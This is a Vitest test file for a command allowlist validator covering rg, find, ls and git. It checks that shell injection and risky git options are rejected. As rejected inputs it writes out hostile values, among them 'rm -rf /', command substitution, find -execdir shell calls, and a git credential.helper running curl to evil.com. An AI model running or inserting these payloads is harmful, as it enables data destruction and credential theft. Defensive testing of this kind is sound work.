/**
 * Tests for command validation - validates command injection prevention
 */

import { describe, it, expect } from 'vitest';
import { validateCommand } from '../src/commandValidator.js';

describe('commandValidator', () => {
  describe('validateCommand', () => {
    describe('command whitelist', () => {
      it('should allow whitelisted commands', () => {
        expect(validateCommand('rg', ['pattern', 'path'])).toEqual({
          isValid: true,
        });
        expect(validateCommand('find', ['.', '-name', '*.ts'])).toEqual({
          isValid: true,
        });
        expect(validateCommand('ls', ['-la'])).toEqual({ isValid: true });
      });

      it('should allow grep as a whitelisted command', () => {
        expect(validateCommand('grep', ['-rn', 'pattern', './src'])).toEqual({
          isValid: true,
        });
      });

      it('should reject non-whitelisted commands', () => {
        const result = validateCommand('rm', ['-rf', '/']);

        expect(result.isValid).toBe(false);
        expect(result.error).toContain("Command 'rm' is not allowed");
        expect(result.error).toContain('Allowed commands');
      });

      it('should reject unknown commands', () => {
        const result = validateCommand('curl', ['http://example.com']);

        expect(result.isValid).toBe(false);
        expect(result.error).toContain("Command 'curl' is not allowed");
      });
    });

    describe('ripgrep pattern detection', () => {
      it('should allow regex patterns in search position', () => {
        // Pattern with pipe (OR) should be allowed in pattern position
        const result = validateCommand('rg', ['foo|bar', './src']);

        expect(result.isValid).toBe(true);
      });

      it('should allow patterns with parentheses', () => {
        const result = validateCommand('rg', ['(foo|bar)+', './src']);

        expect(result.isValid).toBe(true);
      });

      it('should allow glob patterns with -g flag', () => {
        const result = validateCommand('rg', [
          '-g',
          '*.{ts,tsx}',
          'pattern',
          './src',
        ]);

        expect(result.isValid).toBe(true);
      });

      it('should allow glob patterns with --glob flag', () => {
        const result = validateCommand('rg', [
          '--glob',
          '*.{ts,tsx}',
          'pattern',
          './src',
        ]);

        expect(result.isValid).toBe(true);
      });

      it('should allow glob patterns with --include flag', () => {
        const result = validateCommand('rg', [
          '--include',
          '*.ts',
          'pattern',
          './src',
        ]);

        expect(result.isValid).toBe(true);
      });

      it('should allow glob patterns with --exclude flag', () => {
        const result = validateCommand('rg', [
          '--exclude',
          'node_modules',
          'pattern',
          './src',
        ]);

        expect(result.isValid).toBe(true);
      });

      it('should allow glob patterns with --exclude-dir flag', () => {
        const result = validateCommand('rg', [
          '--exclude-dir',
          'dist',
          'pattern',
          './src',
        ]);

        expect(result.isValid).toBe(true);
      });

      it('should skip flag values for -A context lines', () => {
        const result = validateCommand('rg', ['-A', '5', 'pattern', './src']);

        expect(result.isValid).toBe(true);
      });

      it('should skip flag values for -B context lines', () => {
        const result = validateCommand('rg', ['-B', '3', 'pattern', './src']);

        expect(result.isValid).toBe(true);
      });

      it('should skip flag values for -C context lines', () => {
        const result = validateCommand('rg', ['-C', '2', 'pattern', './src']);

        expect(result.isValid).toBe(true);
      });

      it('should skip flag values for -m max count', () => {
        const result = validateCommand('rg', ['-m', '10', 'pattern', './src']);

        expect(result.isValid).toBe(true);
      });

      it('should skip flag values for -t type', () => {
        const result = validateCommand('rg', ['-t', 'ts', 'pattern', './src']);

        expect(result.isValid).toBe(true);
      });

      it('should skip flag values for --type', () => {
        const result = validateCommand('rg', [
          '--type',
          'rust',
          'pattern',
          './src',
        ]);

        expect(result.isValid).toBe(true);
      });

      it('should skip flag values for -T type-not', () => {
        const result = validateCommand('rg', [
          '-T',
          'json',
          'pattern',
          './src',
        ]);

        expect(result.isValid).toBe(true);
      });

      it('should skip flag values for --type-not', () => {
        const result = validateCommand('rg', [
          '--type-not',
          'html',
          'pattern',
          './src',
        ]);

        expect(result.isValid).toBe(true);
      });

      it('should skip flag values for -j threads', () => {
        const result = validateCommand('rg', ['-j', '4', 'pattern', './src']);

        expect(result.isValid).toBe(true);
      });

      it('should skip flag values for --threads', () => {
        const result = validateCommand('rg', [
          '--threads',
          '8',
          'pattern',
          './src',
        ]);

        expect(result.isValid).toBe(true);
      });

      it('should skip flag values for --sort', () => {
        const result = validateCommand('rg', [
          '--sort',
          'path',
          'pattern',
          './src',
        ]);

        expect(result.isValid).toBe(true);
      });

      it('should skip flag values for --sortr', () => {
        const result = validateCommand('rg', [
          '--sortr',
          'modified',
          'pattern',
          './src',
        ]);

        expect(result.isValid).toBe(true);
      });

      it('should skip flag values for --max-filesize', () => {
        const result = validateCommand('rg', [
          '--max-filesize',
          '1M',
          'pattern',
          './src',
        ]);

        expect(result.isValid).toBe(true);
      });

      it('should skip flag values for -E encoding', () => {
        const result = validateCommand('rg', [
          '-E',
          'utf-8',
          'pattern',
          './src',
        ]);

        expect(result.isValid).toBe(true);
      });

      it('should skip flag values for --encoding', () => {
        const result = validateCommand('rg', [
          '--encoding',
          'utf-8',
          'pattern',
          './src',
        ]);

        expect(result.isValid).toBe(true);
      });

      it('should skip flag values for --color', () => {
        const result = validateCommand('rg', [
          '--color',
          'never',
          'pattern',
          './src',
        ]);

        expect(result.isValid).toBe(true);
      });

      it('should handle multiple flags with values', () => {
        const result = validateCommand('rg', [
          '-A',
          '5',
          '-B',
          '3',
          '-m',
          '10',
          '-t',
          'ts',
          '--glob',
          '*.ts',
          'foo|bar',
          './src',
        ]);

        expect(result.isValid).toBe(true);
      });

      it('should reject disallowed runtime execution flags like --pre', () => {
        const result = validateCommand('rg', ['--pre=cat', 'pattern', './src']);

        expect(result.isValid).toBe(false);
        expect(result.error).toContain('not allowed');
      });

      it('should allow literal dash-prefixed patterns after -- separator', () => {
        const result = validateCommand('rg', ['--', '--pre=cat', './src']);
        expect(result.isValid).toBe(true);
      });
    });

    describe('find pattern detection', () => {
      it('should allow patterns after -name', () => {
        const result = validateCommand('find', ['.', '-name', '*.ts']);

        expect(result.isValid).toBe(true);
      });

      it('should allow patterns after -iname', () => {
        const result = validateCommand('find', ['.', '-iname', '*.TEST.ts']);

        expect(result.isValid).toBe(true);
      });

      it('should allow patterns after -path', () => {
        const result = validateCommand('find', [
          '.',
          '-path',
          '*/node_modules/*',
        ]);

        expect(result.isValid).toBe(true);
      });

      it('should allow patterns after -regex', () => {
        const result = validateCommand('find', [
          '.',
          '-regex',
          '.*\\.test\\.ts$',
        ]);

        expect(result.isValid).toBe(true);
      });

      it('should allow -E flag for macOS BSD find extended regex', () => {
        const result = validateCommand('find', [
          '-E',
          '.',
          '-regex',
          '.*\\.(ts|tsx)$',
        ]);

        expect(result.isValid).toBe(true);
      });

      it('should allow -E with -regex and other filters combined', () => {
        const result = validateCommand('find', [
          '-E',
          '/workspace',
          '-maxdepth',
          '5',
          '-type',
          'f',
          '-regex',
          '.*\\.(js|ts|py)$',
        ]);

        expect(result.isValid).toBe(true);
      });

      it('should allow patterns after -size', () => {
        const result = validateCommand('find', ['.', '-size', '+1M']);

        expect(result.isValid).toBe(true);
      });

      it('should allow patterns after -perm', () => {
        const result = validateCommand('find', ['.', '-perm', '755']);

        expect(result.isValid).toBe(true);
      });

      it('should allow parentheses for grouping', () => {
        const result = validateCommand('find', [
          '.',
          '(',
          '-name',
          '*.ts',
          '-o',
          '-name',
          '*.tsx',
          ')',
        ]);

        expect(result.isValid).toBe(true);
      });

      it('should allow -o for OR expressions', () => {
        const result = validateCommand('find', [
          '.',
          '-name',
          '*.ts',
          '-o',
          '-name',
          '*.js',
        ]);

        expect(result.isValid).toBe(true);
      });

      it('should handle complex find expressions', () => {
        const result = validateCommand('find', [
          '.',
          '(',
          '-name',
          '*.ts',
          '-o',
          '-iname',
          '*.tsx',
          ')',
          '-path',
          '*/src/*',
          '-size',
          '+10k',
        ]);

        expect(result.isValid).toBe(true);
      });

      it('should allow find traversal/runtime-safe operators used by builder', () => {
        const result = validateCommand('find', [
          '/workspace',
          '-maxdepth',
          '5',
          '(',
          '-name',
          '*.ts',
          '-o',
          '-iname',
          '*.tsx',
          ')',
          '-prune',
          '-o',
          '-type',
          'f',
          '-print0',
        ]);
        expect(result.isValid).toBe(true);
      });

      it('should reject destructive find operator -delete', () => {
        const result = validateCommand('find', [
          '.',
          '-name',
          '*.log',
          '-delete',
        ]);
        expect(result.isValid).toBe(false);
        expect(result.error).toContain('not allowed');
      });

      it('should reject command-execution operator -execdir', () => {
        const result = validateCommand('find', [
          '.',
          '-name',
          '*.ts',
          '-execdir',
          'sh',
          '-c',
          'id',
          '+',
        ]);
        expect(result.isValid).toBe(false);
        expect(result.error).toContain('not allowed');
      });

      it('should reject prompt-based execution operator -okdir', () => {
        const result = validateCommand('find', [
          '.',
          '-name',
          '*.ts',
          '-okdir',
          'echo',
          'x',
          '+',
        ]);
        expect(result.isValid).toBe(false);
        expect(result.error).toContain('not allowed');
      });

      it('should reject unsupported find operator -quit', () => {
        const result = validateCommand('find', ['.', '-name', '*.ts', '-quit']);
        expect(result.isValid).toBe(false);
        expect(result.error).toContain('not allowed');
      });
    });

    describe('git command validation', () => {
      it('should allow git clone with valid flags', () => {
        expect(
          validateCommand('git', [
            'clone',
            '--depth',
            '1',
            '--single-branch',
            '--branch',
            'main',
            '--',
            'https://github.com/fb/react.git',
            '/tmp/clone-dir',
          ])
        ).toEqual({ isValid: true });
      });

      it('should allow git clone with auth config', () => {
        expect(
          validateCommand('git', [
            '-c',
            'http.extraHeader=Authorization: Bearer token',
            'clone',
            '--depth',
            '1',
            '--filter',
            'blob:none',
            '--sparse',
            '--single-branch',
            '--branch',
            'main',
            '--',
            'https://github.com/org/repo.git',
            '/tmp/dir',
          ])
        ).toEqual({ isValid: true });
      });

      it('should allow git sparse-checkout set', () => {
        expect(
          validateCommand('git', [
            '-C',
            '/tmp/repo',
            'sparse-checkout',
            'set',
            '--',
            'packages/core',
          ])
        ).toEqual({ isValid: true });
      });

      it('should allow git sparse-checkout with flags', () => {
        expect(
          validateCommand('git', [
            'sparse-checkout',
            'set',
            '--cone',
            'src/utils',
          ])
        ).toEqual({ isValid: true });
      });

      it('should allow git sparse-checkout init', () => {
        expect(validateCommand('git', ['sparse-checkout', 'init'])).toEqual({
          isValid: true,
        });
      });

      it('should allow git sparse-checkout list', () => {
        expect(validateCommand('git', ['sparse-checkout', 'list'])).toEqual({
          isValid: true,
        });
      });

      it('should allow git sparse-checkout disable', () => {
        expect(validateCommand('git', ['sparse-checkout', 'disable'])).toEqual({
          isValid: true,
        });
      });

      it('should reject git push', () => {
        const result = validateCommand('git', ['push', 'origin', 'main']);
        expect(result.isValid).toBe(false);
        expect(result.error).toContain('not allowed');
      });

      it('should reject git reset', () => {
        const result = validateCommand('git', ['reset', '--hard']);
        expect(result.isValid).toBe(false);
        expect(result.error).toContain('not allowed');
      });

      it('should reject git rm', () => {
        const result = validateCommand('git', ['rm', '-rf', '.']);
        expect(result.isValid).toBe(false);
        expect(result.error).toContain('not allowed');
      });

      it('should reject disallowed git clone flags', () => {
        const result = validateCommand('git', [
          'clone',
          '--recurse-submodules',
          'https://github.com/fb/react.git',
          '/tmp/dir',
        ]);
        expect(result.isValid).toBe(false);
        expect(result.error).toContain('not allowed');
      });

      it('should reject disallowed git sparse-checkout actions', () => {
        const result = validateCommand('git', ['sparse-checkout', 'reapply']);
        expect(result.isValid).toBe(false);
        expect(result.error).toContain('not allowed');
      });

      it('should reject disallowed git sparse-checkout flags', () => {
        const result = validateCommand('git', [
          'sparse-checkout',
          'set',
          '--stdin',
        ]);
        expect(result.isValid).toBe(false);
        expect(result.error).toContain('not allowed');
      });

      it('should reject git with no subcommand', () => {
        const result = validateCommand('git', []);
        expect(result.isValid).toBe(false);
      });

      it('should handle git -C as a global option before subcommand', () => {
        expect(
          validateCommand('git', [
            '-C',
            '/tmp/repo',
            'clone',
            '--depth',
            '1',
            '--',
            'https://github.com/fb/react.git',
            '/tmp/dir',
          ])
        ).toEqual({ isValid: true });
      });
    });

    describe('dangerous pattern detection', () => {
      it('should reject shell execution patterns in non-pattern args', () => {
        // Path argument with command substitution
        const result = validateCommand('ls', ['-la', '$(rm -rf /)']);

        expect(result.isValid).toBe(false);
        expect(result.error).toContain('Dangerous pattern detected');
      });

      it('should reject backtick command substitution', () => {
        const result = validateCommand('ls', ['-la', '`whoami`']);

        expect(result.isValid).toBe(false);
        expect(result.error).toContain('Dangerous pattern detected');
      });
    });

    describe('git -c config key injection prevention', () => {
      describe('global -c (before subcommand)', () => {
        it('should block core.sshCommand (command execution)', () => {
          const result = validateCommand('git', [
            '-c',
            'core.sshCommand=malicious_script',
            'clone',
            'https://github.com/org/repo.git',
          ]);
          expect(result.isValid).toBe(false);
          expect(result.error).toContain('core.sshCommand');
        });

        it('should block core.hooksPath (hooks directory takeover)', () => {
          const result = validateCommand('git', [
            '-c',
            'core.hooksPath=/tmp/evil-hooks',
            'clone',
            'https://github.com/org/repo.git',
          ]);
          expect(result.isValid).toBe(false);
          expect(result.error).toContain('core.hooksPath');
        });

        it('should block credential.helper (credential exfiltration)', () => {
          const result = validateCommand('git', [
            '-c',
            'credential.helper=/bin/sh -c "curl evil.com"',
            'clone',
            'https://github.com/org/repo.git',
          ]);
          expect(result.isValid).toBe(false);
          expect(result.error).toContain('credential.helper');
        });

        it('should block core.gitProxy (proxy command execution)', () => {
          const result = validateCommand('git', [
            '-c',
            'core.gitProxy=malicious_proxy',
            'clone',
            'https://github.com/org/repo.git',
          ]);
          expect(result.isValid).toBe(false);
          expect(result.error).toContain('core.gitProxy');
        });

        it('should block http.proxy (traffic exfiltration)', () => {
          const result = validateCommand('git', [
            '-c',
            'http.proxy=http://attacker.com',
            'clone',
            'https://github.com/org/repo.git',
          ]);
          expect(result.isValid).toBe(false);
          expect(result.error).toContain('http.proxy');
        });

        it('should block protocol.allow (unsafe protocol enablement)', () => {
          const result = validateCommand('git', [
            '-c',
            'protocol.allow=always',
            'clone',
            'https://github.com/org/repo.git',
          ]);
          expect(result.isValid).toBe(false);
          expect(result.error).toContain('protocol.allow');
        });

        it('should allow safe http.extraHeader for auth tokens', () => {
          expect(
            validateCommand('git', [
              '-c',
              'http.extraHeader=Authorization: Bearer token',
              'clone',
              '--',
              'https://github.com/org/repo.git',
              '/tmp/dir',
            ])
          ).toEqual({ isValid: true });
        });

        it('should allow safe http.version', () => {
          expect(
            validateCommand('git', [
              '-c',
              'http.version=HTTP/1.1',
              'clone',
              'https://github.com/org/repo.git',
            ])
          ).toEqual({ isValid: true });
        });

        it('should block unknown/arbitrary config keys', () => {
          const result = validateCommand('git', [
            '-c',
            'somethingRandom.key=value',
            'clone',
            'https://github.com/org/repo.git',
          ]);
          expect(result.isValid).toBe(false);
        });
      });

      describe('clone-inline -c (inside clone flags)', () => {
        it('should block core.sshCommand inside clone flags', () => {
          const result = validateCommand('git', [
            'clone',
            '-c',
            'core.sshCommand=evil',
            'https://github.com/org/repo.git',
          ]);
          expect(result.isValid).toBe(false);
          expect(result.error).toContain('core.sshCommand');
        });

        it('should allow http.extraHeader inside clone flags', () => {
          expect(
            validateCommand('git', [
              'clone',
              '-c',
              'http.extraHeader=Authorization: Bearer token',
              '--depth',
              '1',
              'https://github.com/org/repo.git',
            ])
          ).toEqual({ isValid: true });
        });
      });
    });

    describe('git clone URL protocol validation', () => {
      it('should allow https:// URLs', () => {
        expect(
          validateCommand('git', ['clone', 'https://github.com/org/repo.git'])
        ).toEqual({ isValid: true });
      });

      it('should allow SSH form git@ URLs', () => {
        expect(
          validateCommand('git', ['clone', 'git@github.com:org/repo.git'])
        ).toEqual({ isValid: true });
      });

      it('should allow ssh:// URLs', () => {
        expect(
          validateCommand('git', ['clone', 'ssh://git@github.com/org/repo.git'])
        ).toEqual({ isValid: true });
      });

      it('should block file:// protocol (local filesystem access)', () => {
        const result = validateCommand('git', ['clone', 'file:///etc/passwd']);
        expect(result.isValid).toBe(false);
        expect(result.error).toContain('file://');
      });

      it('should block git:// protocol (unauthenticated)', () => {
        const result = validateCommand('git', [
          'clone',
          'git://github.com/org/repo.git',
        ]);
        expect(result.isValid).toBe(false);
        expect(result.error).toContain('git://');
      });

      it('should block http:// protocol (unencrypted)', () => {
        const result = validateCommand('git', [
          'clone',
          'http://github.com/org/repo.git',
        ]);
        expect(result.isValid).toBe(false);
        expect(result.error).toContain('http://');
      });

      it('should allow https:// URL after -- separator', () => {
        expect(
          validateCommand('git', [
            'clone',
            '--depth',
            '1',
            '--',
            'https://github.com/org/repo.git',
            '/tmp/dir',
          ])
        ).toEqual({ isValid: true });
      });
    });
  });
});
